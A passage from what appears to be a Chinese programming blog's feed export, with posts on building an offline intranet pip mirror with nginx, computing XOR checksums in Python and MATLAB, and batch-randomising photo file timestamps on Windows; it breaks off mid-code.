<p>  最后，还需要修改下主函数入口的代码，如下所示。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 组装数据，写入Excel表格</span></span><br><span class="line">excel_data = [province_name, province_code, city_name, city_code, district_name, district_code,</span><br><span class="line">              district_lng, district_lat]</span><br><span class="line"></span><br><span class="line"><span class="comment"># myExcel.write_content(excel_data)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"正在写入：<span class="subst">{province_name}</span><span class="subst">{city_name}</span><span class="subst">{district_name}</span>信息"</span>)</span><br><span class="line">write_file(excel_data)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Requests</tag>
        <tag>JSON字符串处理</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】在内网环境搭建 Python 软件源</title>
    <url>/p/61bcec74.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  在某些企业中，由于其项目的特殊性，研发过程可能需要在完全离线的环境下进行，而针对使用 Python 做开发或测试的时候，难免会需要用到大量的第三方软件包。如果每个同事各自都从外网拷贝所需要的软件包，不仅操作麻烦，而且不能方便的汇集和共享，这时，部署一个内网环境的 pip 源，就举足轻重了。
  本篇博客，将基于 Linux 虚拟机，详细的介绍如何在内网离线环境，安装 pip 源，并检验其使用效果。
***</p>
<h1 id="部署环境">2. 部署环境</h1>
<table>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Linux 服务器</td>
<td> ubuntu18.04.5</td>
</tr>
<tr class="even">
<td>2</td>
<td> 内存</td>
<td> 4G</td>
</tr>
<tr class="odd">
<td>3</td>
<td> 硬盘</td>
<td> 100G</td>
</tr>
<tr class="even">
<td>4</td>
<td> 网络</td>
<td>已配置好静态 IP</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="准备工作">3. 准备工作</h1>
<ol type="1">
<li>部署服务器已正常安装好 nginx 服务。</li>
<li>部署服务器已正常安装好 Python3 软件。</li>
<li>部署服务器已预留足够的空间，用于存放软件包。</li>
<li>部署服务器已正常配置 ssh，局域网内可远程 ssh 登录。</li>
<li>已提前准备好常用的 pypi 软件包。</li>
</ol>
<hr>
<h1 id="搭建步骤">4. 搭建步骤</h1>
<h2 id="安装pip2pi">4.1. 安装 pip2pi</h2>
<ol type="1">
<li>从外网下载 pip2pi 源码，并拷贝至服务器进行安装。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 外网执行</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/wolever/pip2pi</span><br><span class="line"><span class="comment"># 内网执行</span></span><br><span class="line"><span class="built_in">cd</span> pip2pi</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="导入软件包">4.2. 导入软件包</h2>
<ol type="1">
<li>在服务器中新建一个用于存放软件包的路径，路径自定义。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/data</span><br></pre></td></tr></tbody></table></figure></li>
<li>在外网环境批量下载需要的软件包，下载方式参考如下。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 依据requirements.txt中的内容，下载软件包源文件至指定目录下</span></span><br><span class="line">pip download -r requirements.txt -d D:\\packages\\</span><br></pre></td></tr></tbody></table></figure>
&gt;
基于 anaconda 和我自己安装的库，整理了一部分软件包列表，下载链接如下，可用于科学计算、数据分析、自动化测试、平台开发等场景。
&gt; 链接：https://share.weiyun.com/AUtGMzaX</li>
<li> 将已下载好的软件包上传至以上路径中。 <img src="/p/61bcec74/软件包上传.webp" alt="软件包上传"></li>
</ol>
<h2 id="建立软件包索引">4.3. 建立软件包索引</h2>
<ol type="1">
<li>软件包在上传或更新之后，就需要重新建立索引，命令如下。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">dir2pip /home/boyce/data/</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="nginx配置">4.4. nginx 配置</h2>
<ol type="1">
<li>以上步骤正确无误后，就是修改 nginx 服务器的配置了。</li>
<li>进入 /etc/nginx/site-enabled 目录，创建一个配置文件，名字任取。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@boyce-virtual-machine:~$ <span class="built_in">cd</span> /etc/nginx/sites-enabled</span><br><span class="line">boyce@boyce-virtual-machine:/etc/nginx/sites-enabled$ <span class="built_in">touch</span> pypiserver</span><br><span class="line">boyce@boyce-virtual-machine:/etc/nginx/sites-enabled$ ll</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 boyce boyce 4096 6月  27 19:03 ./</span><br><span class="line">drwxr-xr-x 8 boyce boyce 4096 6月  25 22:31 ../</span><br><span class="line">lrwxrwxrwx 1 boyce boyce   34 6月  25 22:27 default -&gt; /etc/nginx/sites-available/default</span><br><span class="line">-rw-r--r-- 1 boyce boyce  567 6月  27 19:02 pypiserver</span><br><span class="line">boyce@boyce-virtual-machine:/etc/nginx/sites-enabled$ nano pypiserver</span><br></pre></td></tr></tbody></table></figure></li>
<li>配置内容参考如下。 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">server {</span><br><span class="line">	listen 8589;				# 监听端口，避免使用被占用的端口</span><br><span class="line"></span><br><span class="line">	server_name 192.168.56.132;		# 服务名，填写IP地址或自己的域名即可</span><br><span class="line"></span><br><span class="line">	root /home/boyce/data;			# 软件包根目录</span><br><span class="line">	index index.html;</span><br><span class="line"></span><br><span class="line">	location / {</span><br><span class="line">		try_files $uri $uri/ =404;							</span><br><span class="line">		autoindex on;</span><br><span class="line">		autoindex_exact_size off; 	#显示文件的大小</span><br><span class="line">		autoindex_localtime on; 	#显示文件时间</span><br><span class="line">		#limit_rate_after 5m; 		#5分钟后进行限速</span><br><span class="line">		#limit_rate 200k;		#下载速度限制为200k</span><br><span class="line">	}</span><br><span class="line">	access_log /var/log/nginx/pypiserver.log;	# 日志保存路径</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="重启nginx服务器">4.5. 重启 nginx 服务器</h2>
<ol type="1">
<li>输入如下命令，重启 nginx 服务器。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></tbody></table></figure></li>
<li>查看下 nginx 的当前状态是否正常。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@boyce-virtual-machine:~$ <span class="built_in">sudo</span> systemctl status nginx</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> boyce:</span><br><span class="line">● nginx.service - A high performance web server and a reverse proxy server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Fri 2021-06-25 22:52:28 CST; 1 day 20h ago</span><br><span class="line">     Docs: man:nginx(8)</span><br><span class="line"> Main PID: 17383 (nginx)</span><br><span class="line">    Tasks: 3 (<span class="built_in">limit</span>: 4630)</span><br><span class="line">   CGroup: /system.slice/nginx.service</span><br><span class="line">           ├─17383 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span><br><span class="line">           ├─17384 nginx: worker process</span><br><span class="line">           └─17385 nginx: worker process</span><br><span class="line"></span><br><span class="line">6月 25 22:52:28 boyce-virtual-machine systemd[1]: Starting A high performance web server and a reverse proxy server...</span><br><span class="line">6月 25 22:52:28 boyce-virtual-machine systemd[1]: Started A high performance web server and a reverse proxy server.</span><br><span class="line">boyce@boyce-virtual-machine:~$</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="浏览器访问验证">4.6. 浏览器访问验证</h2>
<ol type="1">
<li>重启 nginx 后，浏览器访问如下地址，查看是否可正常加载出软件包列表。
<img src="/p/61bcec74/浏览器访问效果.webp" alt="浏览器访问效果"></li>
</ol>
<h2 id="pypi源配置">4.7. pypi 源配置</h2>
<ol type="1">
<li>Pip 的配置文件为用户根目录下的：~/.pip/pip.conf（Windows 路径为：C:&lt;UserName&gt;.ini）,
配置如下。 <figure class="highlight ini"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">index-url</span> = http://<span class="number">192.168</span>.<span class="number">56.133</span>:<span class="number">8589</span>/simple/</span><br><span class="line"><span class="attr">trusted-host</span> = <span class="number">192.168</span>.<span class="number">56.133</span>:<span class="number">8589</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>在 <code>Pycharm</code> 软件中，则进入设置页面，进行修改。 <img src="/p/61bcec74/pycharm配置软件源.webp" alt="pycharm配置软件源"></li>
</ol>
<hr>
<h1 id="实现效果">5. 实现效果</h1>
<p>  通过 pip 命令安装其中一个模块，其效果如下，在 nginx 配置中未限速的前提下，下载速度基本可以达到局域网内最高速度（千兆网口）。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@boyce-virtual-machine:/etc/nginx$ pip install jieba --index-url=http://192.168.56.132:8589/simple/ --trusted-host 192.168.56.132</span><br><span class="line">Defaulting to user installation because normal site-packages is not writeable</span><br><span class="line">Looking <span class="keyword">in</span> indexes: http://192.168.56.132:8589/simple/</span><br><span class="line">Collecting jieba</span><br><span class="line">  Downloading http://192.168.56.132:8589/simple/jieba/jieba-0.42.1.tar.gz (19.2 MB)</span><br><span class="line">     |████████████████████████████████| 19.2 MB 127.1 MB/s</span><br><span class="line">Building wheels <span class="keyword">for</span> collected packages: jieba</span><br><span class="line">  Building wheel <span class="keyword">for</span> jieba (setup.py) ... <span class="keyword">done</span></span><br><span class="line">  Created wheel <span class="keyword">for</span> jieba: filename=jieba-0.42.1-py3-none-any.whl size=19316162 sha256=ab0e73b06ce2da185d5a340c91159d796ee6b089669c6f1376e45b69e7942c19</span><br><span class="line">  Stored <span class="keyword">in</span> directory: /home/boyce/.cache/pip/wheels/08/d9/42/eebb357756ac8c25d187f4f7f697268e50e96edb0144de4a4f</span><br><span class="line">Successfully built jieba</span><br><span class="line">Installing collected packages: jieba</span><br><span class="line">Successfully installed jieba-0.42.1</span><br><span class="line">boyce@boyce-virtual-machine:/etc/nginx$</span><br></pre></td></tr></tbody></table></figure><p></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>软件源</tag>
        <tag>Python</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 Python 对十六进制数据进行异或和校验计算</title>
    <url>/p/d25385bc.html</url>
    <content><![CDATA[<h1 id="异或和bcc校验">1. 异或和（BCC）校验</h1>
<h2 id="定义及使用场景">1.1. 定义及使用场景</h2>
<p>异或（Exclusive
OR），一种数学运算符，通常运用于逻辑计算或计算机中的位运算，其计算逻辑是：<code>当且仅当两个输入值同时不相等时，输出值为真（1），否则输出为假（0）</code>，可简单记为 <u>“同为假，异则真”</u>。</p>
<p>异或和校验码，对输入的一批数据按照指定步长进行分割，并依次选取其中相邻的两个数据进行异或计算，并得到最终的异或结果，称之为异或和校验码。异或和校验常用于密码学以及数据通信领域，通过异或和校验，可有效判断数据信息是否有效。</p>
<span id="more"></span>
<h2 id="计算原理">1.2. 计算原理</h2>
<p>假设现有三个十六进制数据 <code>0x7235</code>、<code>0x41F8</code>、<code>0x5C9E</code>。</p>
<ol type="1">
<li><p>先将三个数据分别转换成二进制，转换结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0x7235 = 0b0111 0010 0011 0101</span><br><span class="line"></span><br><span class="line">0x41F8 = 0b0100 0001 1111 1000</span><br><span class="line"> </span><br><span class="line">0x5C9E = 0b0101 1100 1001 1110</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>将前两个二进制数据按位进行异或计算，得到如下结果：
</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0011 0011 1100 1101</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>再将上一步得到的结果与第三个二进制数据按位进行异或计算，得到结果：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0110 1111 0101 0011</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>最后，将二进制数据转换成十六进制，即可得到异或和校验码为 <code>0x6F53</code>。</p></li>
</ol>
<hr>
<h1 id="python实现异或和">2. Python 实现异或和</h1>
<p>在 python 中通过 <code>^</code> 符号，对两个数据进行计算异或，示例如下。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 定义两个十六进制数据，以str类型存储</span></span><br><span class="line">a = <span class="string">'0x10C8'</span></span><br><span class="line">b = <span class="string">'0xA30F'</span></span><br><span class="line">xor_res = <span class="built_in">hex</span>(<span class="built_in">int</span>(a, <span class="number">16</span>) ^ <span class="built_in">int</span>(b, <span class="number">16</span>))</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>在第 4 行代码中，先将字符串 a、b 转换成 int 类型的数据，再通过 <code>^</code> 符号计算两者的异或结果，最后通过 <code>hex()</code> 函数将结果转换成十六进制数据。</p>
</blockquote>
<h1 id="计算一定长度数据的异或和校验码">3.
计算一定长度数据的异或和校验码</h1>
<p>示例代码如下，最终输出的异或和校验码为：<code>0x86EA</code>。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 十六进制数据信息</span></span><br><span class="line">code_data = <span class="string">'847B4CD5E6ED8A9A72601FB90B7AC96EB8DDA316AD83DEFA07512389B9AE783A'</span></span><br><span class="line"><span class="comment"># 定义分割步长，设定为4时，代表每4个字符（2个字节长度）进行分割</span></span><br><span class="line">step = <span class="number">4</span></span><br><span class="line"><span class="comment"># 定义结果变量</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code_data), step):</span><br><span class="line">    code = code_data[i:i + step]</span><br><span class="line">    res ^= <span class="built_in">int</span>(code, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"异或和校验码为： <span class="subst">{<span class="built_in">hex</span>(res).upper()}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>另附 matlab 代码，输出结果与上一致。 </p><figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">hexStr = <span class="string">'847B4CD5E6ED8A9A72601FB90B7AC96EB8DDA316AD83DEFA07512389B9AE783A'</span>;</span><br><span class="line"><span class="comment">% 初始化一个按指定步长分割的矩阵，设置为4，表示分割成2字节长度</span></span><br><span class="line">step = <span class="number">4</span>;</span><br><span class="line">strArray = cell(<span class="number">1</span>, <span class="built_in">ceil</span>(<span class="built_in">length</span>(hexStr) / step));</span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>: <span class="built_in">ceil</span>(<span class="built_in">length</span>(hexStr) / step)</span><br><span class="line">    startIdx = (<span class="built_in">i</span> - <span class="number">1</span>) * step + <span class="number">1</span>;</span><br><span class="line">    endIdx = <span class="built_in">min</span>(<span class="built_in">i</span> * step, <span class="built_in">length</span>(hexStr));</span><br><span class="line">    hex_value = hexStr(startIdx:endIdx);</span><br><span class="line">    res = bitxor(hex2dec(hex_value), res);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">"异或和校验结果："</span> + dec2hex(res));</span><br></pre></td></tr></tbody></table></figure><p></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>BCC校验</tag>
        <tag>异或和校验</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】 基于 Windows 平台批量修改图片 EXIF 信息</title>
    <url>/p/c046778c.html</url>
    <content><![CDATA[<h1 id="需求背景">1. 需求背景</h1>
<p>  周末的时候，突发奇想，想批量修改本地 2000 多张照片的属性信息。一开始，上网找了几个软件，比如 <code>acdsee Pro</code> 等等，通过勾选需要修改的照片，然后右键进入属性页面，展开 exif，就可以批量修改照片的创建时间、修改时间等信息了。
  但是，面对本地的 2000 多张照片，这样一步一步手动修改，显然是不可行的，既费时又费力，而且还特别容易漏掉。
  经过在网上的一番查找，发现可以通过 <code>pywinfile</code> 模块，对照片进行修改操作。既然前辈开发出了可利用的模块，那就好办了，剩下要做的就是整理下自己的需求，然后实现就可以了。
<span id="more"></span></p>
<p>  整理之后，我个人的需求有以下几点： &gt; 1.
修改时间需要存在随机性，时间范围可自定义。 &gt; 2.
同一天内需要存在 N 张照片，N 的范围可以自定义或随机生成。 &gt; 3.
时间可以不需要连续，尽量呈现出离散性。</p>
<hr>
<h1 id="代码实现及说明">2. 代码实现及说明</h1>
<h2 id="类及其属性的定义">2.1. 类及其属性的定义</h2>
<p>  因为针对文件来说，都有一个公共的时间和日期属性，所以使用<code>面对对象</code>的编程思想，会有利于功能的实现。
  定义了一个文件处理的类，包含两个属性，日期和时间。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">''</span></span><br><span class="line">        <span class="variable language_">self</span>.time = <span class="string">''</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="类中的方法">2.2. 类中的方法</h2>
<p>  在类中，分别定义了<code>生成日期</code>、<code>生成时间</code>、<code>修改文件时间</code>和<code>结构化时间</code>四个方法，方法的实现及说明如下。</p>
<h3 id="生成日期方法">2.2.1. 生成日期方法</h3>
<p>  在生成日期的方法中，先调用 random 模块的 randint 方法，随机生成年份和月份，范围可以自定义。
  然后利用 datetime 中的 now 方法，判断随机生成的年是否是今年，以及随机生成的月份是否大于当前月份。如果是，那么将月份设置为当前月份，最大天数设置为今天，否则月份不作处理，最大天数通过 calendar 模块的 monthlen 方法进行生成。
  最后日期再通过 randint 进行随机生成，范围是 [1, max_day]。
  关于本方法执行结果的离散性分析，敬请移步至：<a href="/p/528c0f55.html">《【Python】基于 generate_date 方法生成的日期结果离散性分析与优化》。</a>
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_date</span>(<span class="params">self</span>):</span><br><span class="line">    year = random.randint(<span class="number">2016</span>, <span class="number">2021</span>)</span><br><span class="line">    month = random.randint(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 判断如果随机生成的年和月大于当前年份和月份，那么月份直接用当前月份</span></span><br><span class="line">    <span class="keyword">if</span> year == datetime.now().year <span class="keyword">and</span> month &gt; datetime.now().month:</span><br><span class="line">        max_day = datetime.now().day</span><br><span class="line">        month = datetime.now().month</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        max_day = calendar.monthlen(year, month)</span><br><span class="line">        </span><br><span class="line">    day = random.randint(<span class="number">1</span>, max_day)</span><br><span class="line">    <span class="variable language_">self</span>.date = <span class="string">f"<span class="subst">{year}</span>-<span class="subst">{month}</span>-<span class="subst">{day}</span>"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="生成时间方法">2.2.2. 生成时间方法</h3>
<p>  生成时间方法比较简单，时分秒都通过 randint 方法，随机生成即可。需要注意的是指定的范围需要合法，避免生成无效的时间。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_time</span>(<span class="params">self</span>):</span><br><span class="line">    hour = random.randint(<span class="number">00</span>, <span class="number">23</span>)</span><br><span class="line">    minute = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line">    second = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="variable language_">self</span>.time = <span class="string">f'<span class="subst">{hour}</span>:<span class="subst">{minute}</span>:<span class="subst">{second}</span>'</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="结构化时间方法">2.2.3. 结构化时间方法</h3>
<p>  在这里，定义了一个结构化时间方法，用来将指定格式的时间转换成结构化的时间，供 pywintypes 模块的 Time 方法使用。
&gt; 特殊说明 &gt;
方法中 time_format 指定的时间格式，需要与方法入参 times 的格式保持一致，否则会报错。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_struct</span>(<span class="params">times</span>):</span><br><span class="line">    time_format = <span class="string">"%Y-%m-%d %H:%M:%S"</span>  <span class="comment"># 时间格式</span></span><br><span class="line">    <span class="keyword">return</span> time.localtime(time.mktime(time.strptime(times, time_format)))</span><br></pre></td></tr></tbody></table></figure>
<h3 id="修改时间方法">2.2.4. 修改时间方法</h3>
<p>  在修改时间方法中，首先需要传入一个入参，即被修改的文件名。
  通过调用 time_struct 静态方法，将时间结构化，再利用 Time 方法，将 create_time 变量转换成可用于设置文件时间的类型。最后调用 pywinfile 模块的 SetFileTime 方法，对文件时间信息进行修改操作。
&gt; 特殊说明 &gt;
在前期利用 CreateFile 方法，创建了一个文件句柄，当完成对文件句柄的属性信息修改之后，需要利用 CloseHandle 方法关闭该文件句柄，防止文件一直处于打开状态，导致其他程序无法使用。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_file_time</span>(<span class="params">self, file_name</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class="line"><span class="string">    :param file_name: 文件名</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    create_time = <span class="variable language_">self</span>.time_struct(<span class="string">f"<span class="subst">{self.date}</span> <span class="subst">{self.time}</span>"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_path = os.path.join(root_path, file_name)</span><br><span class="line">        fh = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">None</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        c_times = Time(time.mktime(create_time))</span><br><span class="line">        m_times = Time(time.mktime(create_time))</span><br><span class="line">        a_times = Time(time.mktime(create_time))</span><br><span class="line">        SetFileTime(fh, c_times, m_times, a_times)</span><br><span class="line">        CloseHandle(fh)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{file_name}</span>修改失败，错误信息：<span class="subst">{e}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure>
<h2 id="主函数入口">2.3. 主函数入口</h2>
<p>  最后，是主函数入口的编写。</p>
<ol type="1">
<li>首先是一个 while 循环，以文件总数为条件，文件总数为零时，结束循环。</li>
<li>第 2-5 行，随机生成了一个变量：same_day_random_num，用来决定同一日期的照片张数。然后判断一下 same_day_random_num 变量是否大于当前剩余的文件总数，如果大于，那么将会把当前的文件总数赋值给 same_day_random_num，防止循环越界，造成溢出。</li>
<li>第 7 行代码，是随机打乱一下文件列表的顺序，每轮大循环都会执行，尽量将文件顺序打散。</li>
<li>第 8-9 行，实例化了一个 FileHandle 类，并调用 generate_date 方法随机生成一个日期，后续照片的日期部分就会保持一致了。</li>
<li>第 10-13 行，通过循环 same_day_random_num 次，依次取出前 same_day_random_num 张照片，传给 modify_file_time，进行时间修改操作。</li>
<li>第 15 行，当本轮循环执行完毕后，也就意味着这 same_day_random_num 张照片已经被修改成功了，那么就需要从文件总数中去掉，利用 <code>del</code> 方法，截断文件列表的前 same_day_random_num 个元素即可。</li>
</ol>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(file_list):</span><br><span class="line">    same_day_random_num = random.randint(<span class="number">1</span>, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> same_day_random_num &gt; <span class="built_in">len</span>(file_list):</span><br><span class="line">        <span class="comment"># 如果生成的当天照片数量大于当前的文件总数，数量由当前文件总数决定</span></span><br><span class="line">        same_day_random_num = <span class="built_in">len</span>(file_list)</span><br><span class="line">    </span><br><span class="line">    random.shuffle(file_list)</span><br><span class="line">    my_file = FileHandle()</span><br><span class="line">    my_file.generate_date()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(same_day_random_num):</span><br><span class="line">        filename = file_list[i]</span><br><span class="line">        my_file.generate_time()</span><br><span class="line">        my_file.modify_file_time(filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> file_list[:same_day_random_num]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'已全部修改。'</span>)</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h1 id="整体源码">3. 整体源码</h1>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">"""=================================================</span></span><br><span class="line"><span class="string">@Author : FantasyBoyce</span></span><br><span class="line"><span class="string">@Date   : 2021/1/24 13:12</span></span><br><span class="line"><span class="string">@Desc   : </span></span><br><span class="line"><span class="string">=================================================="""</span></span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> CreateFile, SetFileTime, GetFileTime, CloseHandle</span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING</span><br><span class="line"><span class="keyword">from</span> pywintypes <span class="keyword">import</span> Time  <span class="comment"># 可以忽视这个 Time 报错（运行程序还是没问题的）</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">root_path = <span class="string">r'D:\Temp'</span></span><br><span class="line"></span><br><span class="line">file_list = os.listdir(root_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">''</span></span><br><span class="line">        <span class="variable language_">self</span>.time = <span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_date</span>(<span class="params">self</span>):</span><br><span class="line">        year = random.randint(<span class="number">2016</span>, <span class="number">2021</span>)</span><br><span class="line">        month = random.randint(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断如果随机生成的年和月大于当前年份和月份，那么月份直接用当前月份</span></span><br><span class="line">        <span class="keyword">if</span> year == datetime.now().year <span class="keyword">and</span> month &gt; datetime.now().month:</span><br><span class="line">            max_day = datetime.now().day</span><br><span class="line">            month = datetime.now().month</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_day = calendar.monthlen(year, month)</span><br><span class="line">        </span><br><span class="line">        day = random.randint(<span class="number">1</span>, max_day)</span><br><span class="line">        <span class="variable language_">self</span>.date = <span class="string">f"<span class="subst">{year}</span>-<span class="subst">{month}</span>-<span class="subst">{day}</span>"</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_time</span>(<span class="params">self</span>):</span><br><span class="line">        hour = random.randint(<span class="number">00</span>, <span class="number">23</span>)</span><br><span class="line">        minute = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line">        second = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.time = <span class="string">f'<span class="subst">{hour}</span>:<span class="subst">{minute}</span>:<span class="subst">{second}</span>'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_file_time</span>(<span class="params">self, file_name</span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class="line"><span class="string">        :param file_name: 文件名</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        create_time = <span class="variable language_">self</span>.time_struct(<span class="string">f"<span class="subst">{self.date}</span> <span class="subst">{self.time}</span>"</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_path = os.path.join(root_path, file_name)</span><br><span class="line">            fh = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">None</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            c_times = Time(time.mktime(create_time))</span><br><span class="line">            m_times = Time(time.mktime(create_time))</span><br><span class="line">            a_times = Time(time.mktime(create_time))</span><br><span class="line">            SetFileTime(fh, c_times, m_times, a_times)</span><br><span class="line">            CloseHandle(fh)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"<span 